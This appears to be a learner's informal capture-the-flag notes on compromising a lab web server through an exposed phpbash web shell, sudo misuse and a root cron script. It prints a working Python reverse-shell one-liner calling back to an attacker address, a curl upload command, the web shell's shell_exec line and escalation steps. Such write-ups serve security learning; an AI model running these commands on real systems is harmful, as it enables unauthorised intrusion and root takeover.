port 80 is only thing open

Arrexel's Development Site -> http title
- This can be found from a github repo -> https://github.com/Arrexel/phpbash

no cgi-bin
apache 2.4.18 has a local priv esc -> linux/local/46676.php

looks like we can view directories
- images most recent upload date was 2017-12-04

Wierd Files:
- /php/sendMail.php
- /dev/phpbash.php

Looking at https://github.com/Arrexel/phpbash
- one of the issues is a xss

we see that that there is this line of code for file upload
`} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {`

curl -F 'path=/&file=@test.php' http://10.129.223.52/dev/phpbash.php

trying to send that didnt work, not sure if cause my stuff was wrong or what, but decided to read out the phpbash that was being used and saw
`<?php /* phpbash by Alexander Reid (Arrexel) */ if (ISSET($_POST['cmd'])) { echo shell_exec($_POST['cmd']." 2>&1"); die(); } ?>`

sudo tcpdump -i tun0 <-- good for testing ping backs
tried to wget a file, but couldnt write to that directory
always just go through a list of reverse shells, just cause one didnt work, doesnt mean another one couldnt

sent that through and got a reverse shell
`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.146", 6000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- guessing this worked cause it spawned a new process

- upgraded to a tty shell by doing
`python -c 'import pty; pty.spawn("/bin/sh")'`

Just rememembered that there is a local priv esc vuln for apache that we had found earlier
- just need to get this file on the server
...spent all this time looking for how to upload php code...uploads had all permissions rearing to go...
I just need to make sure to look at everything, somehow skimmed past this????

Simple server served:
started running linpeas on it
trying to run php xploit

we see this in sudo -l
`(scriptmanager : scriptmanager) NOPASSWD: ALL`
which means we can execute sudo without a password and everything we write has scriptmanager access
To access the above we need to do
`sudo -u scriptmanager [cmd]`

my problem was that I was still executing sudo as www-data, i needed to use the -u option to execute it as scriptmanager, then it wouldnt ask me for a password

Seems uncommon for a user to do `sudo -l` <- could be hints at something

Something interesting:
```
╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/scripts/test.txt
/home/scriptmanager/.gnupg/trustdb.gpg
/home/scriptmanager/.gnupg/pubring.gpg
/home/scriptmanager/.gnupg/gpg.conf
/var/log/auth.log
/var/log/syslog
```

after reading test.py in scripts, we can assume that a cron job executes test.py as root and thats why test.txt has root permissions
so working with this we can edit the file being produced
After modifying it a bit and using wget to get a new version, we wait some time and see that test.txt was changed!
So now going to write a bash script to esecute /bash/sh and modify permissions to allow for publix execution
had to play with the permissions in python a bit in local env to get it to work 0o0777 instead of 777
still looks like it uses the permissions of the user who executed it rather than the one who wrote the file -> look into this more

ended up just changing test.py to create a reverse shell back to me to get root exec
- will need to look into file permissions and how I could set a SUID file to execute the test.py as root

*Dont use wrtieups as much of a crutch, look over the notes you have taken
*Should prob look into things a bit more, try to understand them better when you google stuff

